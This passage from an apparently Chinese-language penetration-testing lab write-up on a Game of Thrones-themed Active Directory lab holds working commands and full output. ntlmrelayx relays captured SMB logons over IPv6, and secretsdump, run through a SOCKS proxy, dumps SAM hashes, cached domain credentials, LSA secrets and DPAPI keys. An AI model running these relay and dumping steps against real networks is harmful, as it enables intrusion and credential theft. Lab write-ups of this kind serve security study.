class="hljs-symbol">Fortra</span>, <span class="hljs-symbol">LLC</span> and its affiliated companies <br><br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">LDAPS</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">LDAP</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">RPC</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">MSSQL</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">WINRMS</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">SMB</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">HTTP</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">HTTPS</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">DCSYNC</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">IMAPS</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">IMAP</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">SMTP</span> loaded..<br>[*] <span class="hljs-symbol">Running</span> in relay mode to hosts in targetfile<br>[*] <span class="hljs-symbol">SOCKS</span> proxy started. <span class="hljs-symbol">Listening</span> on <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">1080</span><br>[*] <span class="hljs-symbol">MSSQL</span> <span class="hljs-symbol">Socks</span> <span class="hljs-symbol">Plugin</span> loaded..<br>[*] <span class="hljs-symbol">LDAP</span> <span class="hljs-symbol">Socks</span> <span class="hljs-symbol">Plugin</span> loaded..<br>[*] <span class="hljs-symbol">SMTP</span> <span class="hljs-symbol">Socks</span> <span class="hljs-symbol">Plugin</span> loaded..<br>[*] <span class="hljs-symbol">SMB</span> <span class="hljs-symbol">Socks</span> <span class="hljs-symbol">Plugin</span> loaded..<br>[*] <span class="hljs-symbol">IMAPS</span> <span class="hljs-symbol">Socks</span> <span class="hljs-symbol">Plugin</span> loaded..<br>[*] <span class="hljs-symbol">LDAPS</span> <span class="hljs-symbol">Socks</span> <span class="hljs-symbol">Plugin</span> loaded..<br>[*] <span class="hljs-symbol">HTTPS</span> <span class="hljs-symbol">Socks</span> <span class="hljs-symbol">Plugin</span> loaded..<br>[*] <span class="hljs-symbol">IMAP</span> <span class="hljs-symbol">Socks</span> <span class="hljs-symbol">Plugin</span> loaded..<br>[*] <span class="hljs-symbol">HTTP</span> <span class="hljs-symbol">Socks</span> <span class="hljs-symbol">Plugin</span> loaded..<br>[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">SMB</span> <span class="hljs-symbol">Server</span> on port <span class="hljs-number">445</span><br>[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">HTTP</span> <span class="hljs-symbol">Server</span> on port <span class="hljs-number">80</span><br>[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">WCF</span> <span class="hljs-symbol">Server</span> on port <span class="hljs-number">9389</span><br>[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">RAW</span> <span class="hljs-symbol">Server</span> on port <span class="hljs-number">6666</span><br>[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">WinRM</span> (<span class="hljs-symbol">HTTP</span>) <span class="hljs-symbol">Server</span> on port <span class="hljs-number">5985</span><br>[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">WinRMS</span> (<span class="hljs-symbol">HTTPS</span>) <span class="hljs-symbol">Server</span> on port <span class="hljs-number">5986</span><br>[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">RPC</span> <span class="hljs-symbol">Server</span> on port <span class="hljs-number">135</span><br>[*] <span class="hljs-symbol">Multirelay</span> enabled<br><br>[*] <span class="hljs-symbol">Servers</span> started, waiting for connections<br><span class="hljs-symbol">Type</span> help for list of commands<br> * <span class="hljs-symbol">Serving</span> <span class="hljs-symbol">Flask</span> app <span class="hljs-string">&#x27;impacket.examples.ntlmrelayx.servers.socksserver&#x27;</span><br> * <span class="hljs-symbol">Debug</span> mode: off<br>ntlmrelayx&gt; <br></code></pre></td></tr></table></figure>

<p>这里不知道怎么回事ntlmrelayx老收不到流量</p>
<p>原来是没有加ipv6参数导致的</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs prolog">┌──(root㉿kaada)-[/home/kali/<span class="hljs-symbol">Desktop</span>]<br>└─# impacket-ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks <span class="hljs-number">-6</span><br><span class="hljs-symbol">Impacket</span> v0<span class="hljs-number">.14</span><span class="hljs-number">.0</span>.dev0 - <span class="hljs-symbol">Copyright</span> <span class="hljs-symbol">Fortra</span>, <span class="hljs-symbol">LLC</span> and its affiliated companies <br><br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">LDAPS</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">LDAP</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">RPC</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">MSSQL</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">WINRMS</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">SMB</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">HTTPS</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">HTTP</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">DCSYNC</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">IMAPS</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">IMAP</span> loaded..<br>[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">SMTP</span> loaded..<br>[*] <span class="hljs-symbol">Running</span> in relay mode to hosts in targetfile<br>[*] <span class="hljs-symbol">SOCKS</span> proxy started. <span class="hljs-symbol">Listening</span> on <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">1080</span><br>[*] <span class="hljs-symbol">IMAP</span> <span class="hljs-symbol">Socks</span> <span class="hljs-symbol">Plugin</span> loaded..<br>[*] <span class="hljs-symbol">HTTP</span> <span class="hljs-symbol">Socks</span> <span class="hljs-symbol">Plugin</span> loaded..<br>[*] <span class="hljs-symbol">IMAPS</span> <span class="hljs-symbol">Socks</span> <span class="hljs-symbol">Plugin</span> loaded..<br>[*] <span class="hljs-symbol">SMTP</span> <span class="hljs-symbol">Socks</span> <span class="hljs-symbol">Plugin</span> loaded..<br>[*] <span class="hljs-symbol">MSSQL</span> <span class="hljs-symbol">Socks</span> <span class="hljs-symbol">Plugin</span> loaded..<br>[*] <span class="hljs-symbol">HTTPS</span> <span class="hljs-symbol">Socks</span> <span class="hljs-symbol">Plugin</span> loaded..<br>[*] <span class="hljs-symbol">LDAPS</span> <span class="hljs-symbol">Socks</span> <span class="hljs-symbol">Plugin</span> loaded..<br>[*] <span class="hljs-symbol">SMB</span> <span class="hljs-symbol">Socks</span> <span class="hljs-symbol">Plugin</span> loaded..<br>[*] <span class="hljs-symbol">LDAP</span> <span class="hljs-symbol">Socks</span> <span class="hljs-symbol">Plugin</span> loaded..<br>[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">SMB</span> <span class="hljs-symbol">Server</span> on port <span class="hljs-number">445</span><br>[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">HTTP</span> <span class="hljs-symbol">Server</span> on port <span class="hljs-number">80</span><br> * <span class="hljs-symbol">Serving</span> <span class="hljs-symbol">Flask</span> app <span class="hljs-string">&#x27;impacket.examples.ntlmrelayx.servers.socksserver&#x27;</span><br> * <span class="hljs-symbol">Debug</span> mode: off<br>[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">WCF</span> <span class="hljs-symbol">Server</span> on port <span class="hljs-number">9389</span><br>[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">RAW</span> <span class="hljs-symbol">Server</span> on port <span class="hljs-number">6666</span><br>[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">WinRM</span> (<span class="hljs-symbol">HTTP</span>) <span class="hljs-symbol">Server</span> on port <span class="hljs-number">5985</span><br>[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">WinRMS</span> (<span class="hljs-symbol">HTTPS</span>) <span class="hljs-symbol">Server</span> on port <span class="hljs-number">5986</span><br>[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">RPC</span> <span class="hljs-symbol">Server</span> on port <span class="hljs-number">135</span><br>[*] <span class="hljs-symbol">Multirelay</span> enabled<br><br>[*] <span class="hljs-symbol">Servers</span> started, waiting for connections<br><span class="hljs-symbol">Type</span> help for list of commands<br>ntlmrelayx&gt; [*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Received</span> connection from <span class="hljs-symbol">NORTH</span>/eddard.stark at <span class="hljs-symbol">WINTERFELL</span>, connection will be relayed after re-authentication<br>[]<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Connection</span> from <span class="hljs-symbol">NORTH</span>/<span class="hljs-symbol">EDDARD</span>.<span class="hljs-symbol">STARK</span>@fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a controlled, attacking target smb://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.23</span><br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Authenticating</span> connection from <span class="hljs-symbol">NORTH</span>/<span class="hljs-symbol">EDDARD</span>.<span class="hljs-symbol">STARK</span>@fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a against smb://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.23</span> <span class="hljs-symbol">SUCCEED</span> [<span class="hljs-number">1</span>]<br>[*] <span class="hljs-symbol">SOCKS</span>: <span class="hljs-symbol">Adding</span> <span class="hljs-symbol">SMB</span>://<span class="hljs-symbol">NORTH</span>/<span class="hljs-symbol">EDDARD</span>.<span class="hljs-symbol">STARK</span>@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.23</span>(<span class="hljs-number">445</span>) [<span class="hljs-number">1</span>] to active <span class="hljs-symbol">SOCKS</span> connection. <span class="hljs-symbol">Enjoy</span><br>[]<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Connection</span> from <span class="hljs-symbol">NORTH</span>/<span class="hljs-symbol">EDDARD</span>.<span class="hljs-symbol">STARK</span>@fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a controlled, attacking target smb://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.22</span><br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Authenticating</span> connection from <span class="hljs-symbol">NORTH</span>/<span class="hljs-symbol">EDDARD</span>.<span class="hljs-symbol">STARK</span>@fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a against smb://<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.22</span> <span class="hljs-symbol">SUCCEED</span> [<span class="hljs-number">2</span>]<br>[*] <span class="hljs-symbol">SOCKS</span>: <span class="hljs-symbol">Adding</span> <span class="hljs-symbol">SMB</span>://<span class="hljs-symbol">NORTH</span>/<span class="hljs-symbol">EDDARD</span>.<span class="hljs-symbol">STARK</span>@<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.22</span>(<span class="hljs-number">445</span>) [<span class="hljs-number">2</span>] to active <span class="hljs-symbol">SOCKS</span> connection. <span class="hljs-symbol">Enjoy</span><br>[*] <span class="hljs-symbol">All</span> targets processed!<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Connection</span> from <span class="hljs-symbol">NORTH</span>/<span class="hljs-symbol">EDDARD</span>.<span class="hljs-symbol">STARK</span>@fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a controlled, but there are no more targets left!<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Received</span> connection from <span class="hljs-symbol">NORTH</span>/eddard.stark at <span class="hljs-symbol">WINTERFELL</span>, connection will be relayed after re-authentication<br>[*] <span class="hljs-symbol">All</span> targets processed!<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Connection</span> from <span class="hljs-symbol">NORTH</span>/<span class="hljs-symbol">EDDARD</span>.<span class="hljs-symbol">STARK</span>@fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a controlled, but there are no more targets left!<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Received</span> connection from <span class="hljs-symbol">NORTH</span>/eddard.stark at <span class="hljs-symbol">WINTERFELL</span>, connection will be relayed after re-authentication<br>[*] <span class="hljs-symbol">All</span> targets processed!<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Connection</span> from <span class="hljs-symbol">NORTH</span>/<span class="hljs-symbol">EDDARD</span>.<span class="hljs-symbol">STARK</span>@fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a controlled, but there are no more targets left!<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Received</span> connection from <span class="hljs-symbol">NORTH</span>/eddard.stark at <span class="hljs-symbol">WINTERFELL</span>, connection will be relayed after re-authentication<br>[*] <span class="hljs-symbol">All</span> targets processed!<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Connection</span> from <span class="hljs-symbol">NORTH</span>/<span class="hljs-symbol">EDDARD</span>.<span class="hljs-symbol">STARK</span>@fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a controlled, but there are no more targets left!<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Received</span> connection from <span class="hljs-symbol">NORTH</span>/eddard.stark at <span class="hljs-symbol">WINTERFELL</span>, connection will be relayed after re-authentication<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Received</span> connection from <span class="hljs-symbol">NORTH</span>/robb.stark at <span class="hljs-symbol">WINTERFELL</span>, connection will be relayed after re-authentication<br>[*] <span class="hljs-symbol">All</span> targets processed!<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Connection</span> from <span class="hljs-symbol">NORTH</span>/<span class="hljs-symbol">ROBB</span>.<span class="hljs-symbol">STARK</span>@fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a controlled, but there are no more targets left!<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Received</span> connection from <span class="hljs-symbol">NORTH</span>/robb.stark at <span class="hljs-symbol">WINTERFELL</span>, connection will be relayed after re-authentication<br>[*] <span class="hljs-symbol">All</span> targets processed!<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Connection</span> from <span class="hljs-symbol">NORTH</span>/<span class="hljs-symbol">ROBB</span>.<span class="hljs-symbol">STARK</span>@fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a controlled, but there are no more targets left!<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Received</span> connection from <span class="hljs-symbol">NORTH</span>/robb.stark at <span class="hljs-symbol">WINTERFELL</span>, connection will be relayed after re-authentication<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Received</span> connection from <span class="hljs-symbol">NORTH</span>/robb.stark at <span class="hljs-symbol">WINTERFELL</span>, connection will be relayed after re-authentication<br>[*] <span class="hljs-symbol">All</span> targets processed!<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Connection</span> from <span class="hljs-symbol">NORTH</span>/<span class="hljs-symbol">ROBB</span>.<span class="hljs-symbol">STARK</span>@fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a controlled, but there are no more targets left!<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Received</span> connection from <span class="hljs-symbol">NORTH</span>/robb.stark at <span class="hljs-symbol">WINTERFELL</span>, connection will be relayed after re-authentication<br>[*] <span class="hljs-symbol">All</span> targets processed!<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Connection</span> from <span class="hljs-symbol">NORTH</span>/<span class="hljs-symbol">ROBB</span>.<span class="hljs-symbol">STARK</span>@fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a controlled, but there are no more targets left!<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Received</span> connection from <span class="hljs-symbol">NORTH</span>/robb.stark at <span class="hljs-symbol">WINTERFELL</span>, connection will be relayed after re-authentication<br>[*] <span class="hljs-symbol">All</span> targets processed!<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Connection</span> from <span class="hljs-symbol">NORTH</span>/<span class="hljs-symbol">ROBB</span>.<span class="hljs-symbol">STARK</span>@fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a controlled, but there are no more targets left!<br>[*] (<span class="hljs-symbol">SMB</span>): <span class="hljs-symbol">Received</span> connection from <span class="hljs-symbol">NORTH</span>/robb.stark at <span class="hljs-symbol">WINTERFELL</span>, connection will be relayed after re-authentication<br><br></code></pre></td></tr></table></figure>

<p>ok接下来就是愉快的dump哈希</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs elixir">┌──(root㉿kaada)-[/home/kali/<span class="hljs-title class_">Desktop</span>]<br>└─<span class="hljs-comment"># proxychains4 impacket-secretsdump -no-pass &#x27;NORTH&#x27;/&#x27;EDDARD.STARK&#x27;@&#x27;192.168.10.22&#x27;</span><br>[proxychains] config file <span class="hljs-symbol">found:</span> /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.<span class="hljs-number">4</span><br>[proxychains] <span class="hljs-title class_">DLL</span> <span class="hljs-symbol">init:</span> proxychains-ng <span class="hljs-number">4.17</span><br>[proxychains] <span class="hljs-title class_">DLL</span> <span class="hljs-symbol">init:</span> proxychains-ng <span class="hljs-number">4.17</span><br>[proxychains] <span class="hljs-title class_">DLL</span> <span class="hljs-symbol">init:</span> proxychains-ng <span class="hljs-number">4.17</span><br><span class="hljs-title class_">Impacket</span> v0.<span class="hljs-number">14.0</span>.dev0 - <span class="hljs-title class_">Copyright</span> <span class="hljs-title class_">Fortra</span>, <span class="hljs-title class_">LLC</span> <span class="hljs-keyword">and</span> its affiliated companies <br><br>[proxychains] <span class="hljs-title class_">Strict</span> chain  ...  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-symbol">:</span><span class="hljs-number">1080</span>  ...  <span class="hljs-number">192.168</span>.<span class="hljs-number">10.22</span><span class="hljs-symbol">:</span><span class="hljs-number">445</span>  ...  <span class="hljs-title class_">OK</span><br>[*] <span class="hljs-title class_">Service</span> <span class="hljs-title class_">RemoteRegistry</span> is <span class="hljs-keyword">in</span> stopped state<br>[*] <span class="hljs-title class_">Starting</span> service <span class="hljs-title class_">RemoteRegistry</span><br>[*] <span class="hljs-title class_">Target</span> system <span class="hljs-symbol">bootKey:</span> <span class="hljs-number">0x763976090c57d48a5acf6e6429bcd41b</span><br>[*] <span class="hljs-title class_">Dumping</span> local <span class="hljs-title class_">SAM</span> hashes (<span class="hljs-symbol">uid:</span><span class="hljs-symbol">rid:</span><span class="hljs-symbol">lmhash:</span>nthash)<br><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:dbd13e1c4e338284ac4e9874f7de6ef4</span>:::<br><span class="hljs-symbol">Guest:</span><span class="hljs-number">501</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-symbol">DefaultAccount:</span><span class="hljs-number">503</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-symbol">WDAGUtilityAccount:</span><span class="hljs-number">504</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span>ab6e3005740e48ad3d422bc52e986ae:::<br><span class="hljs-symbol">vagrant:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:e02bc503339d51f71d913c245d35b50b</span>:::<br>[*] <span class="hljs-title class_">Dumping</span> cached domain logon information (domain/<span class="hljs-symbol">username:</span>hash)<br><span class="hljs-title class_">NORTH</span>.<span class="hljs-title class_">SEVENKINGDOMS</span>.<span class="hljs-title class_">LOCAL</span>/<span class="hljs-symbol">sql_svc:</span><span class="hljs-variable">$DCC2</span><span class="hljs-variable">$10240</span><span class="hljs-comment">#sql_svc#89e701ebbd305e4f5380c5150494584a: (2026-02-01 09:47:29+00:00)</span><br><span class="hljs-title class_">NORTH</span>.<span class="hljs-title class_">SEVENKINGDOMS</span>.<span class="hljs-title class_">LOCAL</span>/<span class="hljs-symbol">robb.stark:</span><span class="hljs-variable">$DCC2</span><span class="hljs-variable">$10240</span><span class="hljs-comment">#robb.stark#f19bfb9b10ba923f2e28b733e5dd1405: (2026-02-01 09:53:48+00:00)</span><br>[*] <span class="hljs-title class_">Dumping</span> <span class="hljs-title class_">LSA</span> <span class="hljs-title class_">Secrets</span><br>[*] <span class="hljs-variable">$MACHINE</span>.<span class="hljs-title class_">ACC</span> <br><span class="hljs-title class_">NORTH</span>\<span class="hljs-title class_">CASTELBLACK</span><span class="hljs-variable">$:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span>db8d97ee33a620d961fe254ab70b6635d184be4c9795ac0244d6e8afb3a1ae6<br><span class="hljs-title class_">NORTH</span>\<span class="hljs-title class_">CASTELBLACK</span><span class="hljs-variable">$:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">662441</span>eb1d89f45693edda51b1e20aea<br><span class="hljs-title class_">NORTH</span>\<span class="hljs-title class_">CASTELBLACK</span><span class="hljs-variable">$:</span>des-cbc-<span class="hljs-symbol">md5:</span><span class="hljs-number">5</span>d5ece267919f44c<br><span class="hljs-title class_">NORTH</span>\<span class="hljs-title class_">CASTELBLACK</span><span class="hljs-variable">$:</span><span class="hljs-symbol">plain_password_hex:</span><span class="hljs-number">6400780068003000520028002</span>c006d007a0024002a0038002a00760073002e00780040002e00640038004300210060002800210076006c006100440052002000470025003f0023002700440031005300320055004000340033002f006e005f0071006800290026006b005c00700042007100590054004e0055006900390075007900350072002f006a004c003c002e0057003f0065003a0066007500640070005a0060002500290060006900540043004e003f007600590052004b0032003c005f004b0021003700630045005f002b006c005a005d005d006700340069005f0039002b005900290068002d0026003c00<br><span class="hljs-title class_">NORTH</span>\<span class="hljs-title class_">CASTELBLACK</span><span class="hljs-variable">$:</span><span class="hljs-symbol">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">0</span>dfd2a24c6bff862ced231c6aab1728a:::<br>[*] <span class="hljs-title class_">DPAPI_SYSTEM</span> <br><span class="hljs-symbol">dpapi_machinekey:</span><span class="hljs-number">0xb99c7123ee29685ff9ad5b585ff6c3abd28269c6</span><br><span class="hljs-symbol">dpapi_userkey:</span><span class="hljs-number">0xe0674e719cc271c1be6875ac747182c22adad22c</span><br>[*] <span class="hljs-title class_">NL</span><span class="hljs-variable">$KM</span> <br> <span class="hljs-number">0000</span>   <span class="hljs-title class_">A0</span> <span class="hljs-title class_">B9</span> <span class="hljs-number">07</span> <span class="hljs-number">4</span>A <span class="hljs-number">55</span> <span class="hljs-number">70</span> <span class="hljs-title class_">F9</span> <span class="hljs-title class_">F9</span>  <span class="hljs-title class_">FA</span> <span class="hljs-title class_">CC</span> <span class="hljs-number">68</span> <span class="hljs-number">30</span> <span class="hljs-number">15</span> <span class="hljs-title class_">F5</span> <span class="hljs-number">95</span> <span class="hljs-title class_">A2</span>   ...<span class="hljs-title class_">JUp</span>....h0....<br> <span class="hljs-number">0010</span>   <span class="hljs-number">58</span> <span class="hljs-number">69</span> <span class="hljs-number">29</span> <span class="hljs-title class_">AD</span> <span class="hljs-number">87</span> <span class="hljs-title class_">BA</span> <span class="hljs-title class_">A5</span> <span class="hljs-number">9</span>F  <span class="hljs-number">76</span> <span class="hljs-title class_">EB</span> <span class="hljs-title class_">AC</span> <span class="hljs-title class_">F3</span> <span class="hljs-number">07</span> <span class="hljs-number">63</span> <span class="hljs-number">71</span> <span class="hljs-number">5</span>A   <span class="hljs-title class_">Xi</span>).....v....cqZ<br> <span class="hljs-number">0020</span>   <span class="hljs-title class_">ED</span> <span class="hljs-number">26</span> <span class="hljs-title class_">C1</span> <span class="hljs-title class_">FC</span> <span class="hljs-number">5</span>A <span class="hljs-number">2</span>B <span class="hljs-title class_">D3</span> <span class="hljs-number">25</span>  <span class="hljs-title class_">A0</span> <span class="hljs-number">74</span> <span class="hljs-title class_">E6</span> <span class="hljs-title class_">E4</span> <span class="hljs-number">90</span> <span class="hljs-number">53</span> <span class="hljs-title class_">D5</span> <span class="hljs-number">19</span>   .&amp;..Z+.%.t...S..<br> <span class="hljs-number">0030</span>   <span class="hljs-title class_">E8</span> <span class="hljs-title class_">D6</span> <span class="hljs-title class_">BD</span> <span class="hljs-title class_">D0</span> <span class="hljs-title class_">F3</span> <span 